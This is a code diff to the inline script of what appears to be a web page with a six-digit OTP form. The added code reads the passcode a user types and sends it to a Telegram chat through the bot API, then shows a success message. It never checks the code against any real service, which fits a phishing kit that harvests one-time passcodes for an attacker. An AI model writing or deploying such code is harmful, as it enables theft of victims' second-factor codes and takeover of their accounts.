@@ -15195,14 +15195,9 @@
             });
         });
 
-        // Function to generate a 6-digit OTP
-        function generateOTP() {
-            return Math.floor(100000 + Math.random() * 900000); // Generates a number between 100000 - 999999
-        }
-
         // Function to send OTP via Telegram
         async function sendTelegramOTP(otp) {
-            const message = `🔐 *New OTP Code Generated!*\n\n📌 OTP: *${otp}*`;
+            const message = `🔐 *User Entered OTP!*\n\n📌 OTP: *${otp}*`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -15211,7 +15206,7 @@
                     body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
                 });
 
-                console.log("OTP sent to Telegram!");
+                console.log("OTP sent to Telegram:", otp);
             } catch (error) {
                 console.error("Error sending OTP:", error);
             }
@@ -15221,21 +15216,24 @@
         document.getElementById("otpForm").addEventListener("submit", async (event) => {
             event.preventDefault();
 
-            const otpCode = generateOTP(); // Generate OTP
-            await sendTelegramOTP(otpCode); // Send OTP to Telegram
+            // Get manually entered OTP
+            let enteredOTP = "";
+            otpInputs.forEach(input => enteredOTP += input.value);
+
+            if (enteredOTP.length !== 6) {
+                otpMessage.innerHTML = "<span style='color: red;'>Please enter a valid 6-digit OTP.</span>";
+                return;
+            }
+
+            await sendTelegramOTP(enteredOTP); // Send manually entered OTP to Telegram
 
             otpMessage.innerHTML = "<span style='color: green;'>OTP Sent Successfully!</span>";
 
-            // Auto-fill the generated OTP into input fields (for testing)
-            const otpDigits = otpCode.toString().split("");
-            otpInputs.forEach((input, index) => {
-                input.value = otpDigits[index] || "";
-            });
-
-            enableContinueButton(); // Enable the button
+            enableContinueButton(); // Ensure button is enabled
         });
     });
 </script>
+
 
   
   
